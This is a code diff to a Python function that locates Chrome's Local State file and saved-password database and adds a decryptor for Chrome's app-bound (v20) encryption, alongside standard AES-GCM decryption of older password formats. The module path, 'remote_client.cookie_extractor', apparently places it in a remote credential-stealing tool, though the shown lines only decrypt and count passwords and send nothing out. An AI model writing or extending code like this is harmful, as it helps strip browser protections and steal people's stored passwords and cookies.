@@ -85,7 +85,20 @@ def _count_passwords() -> dict[str, Any]:
     user_data_dir = _get_chrome_user_data_dir()
     local_state = user_data_dir / "Local State" if user_data_dir else None
     decryption_key = _load_password_decryption_key(local_state)
-    result["decryption_available"] = decryption_key is not None
+    
+    # Also try to get ABE decryptor for v20 passwords
+    abe_decryptor = None
+    if local_state and local_state.exists():
+        try:
+            from remote_client.cookie_extractor.app_bound_encryption import AppBoundDecryptor
+            abe_decryptor = AppBoundDecryptor(local_state)
+            if abe_decryptor.is_available:  # is_available is a property, not method
+                result["decryption_available"] = True
+        except Exception:
+            pass
+    
+    if decryption_key is not None:
+        result["decryption_available"] = True
     
     conn = None
     try:
@@ -118,8 +131,17 @@ def _count_passwords() -> dict[str, Any]:
                     encrypted_count += 1
                     if pwd_bytes.startswith(b"v20"):
                         v20_count += 1
+                        # Try ABE decryptor for v20 passwords
+                        if abe_decryptor and abe_decryptor.is_available:
+                            try:
+                                plaintext = abe_decryptor.decrypt_value(pwd_bytes)
+                                if plaintext:
+                                    decrypted_count += 1
+                                    continue  # Successfully decrypted
+                            except Exception:
+                                pass
                     
-                    # Try to decrypt
+                    # Try standard AES-GCM decryption for v10/v11/v12 or as fallback
                     if decryption_key:
                         try:
                             from cryptography.hazmat.primitives.ciphers.aead import AESGCM
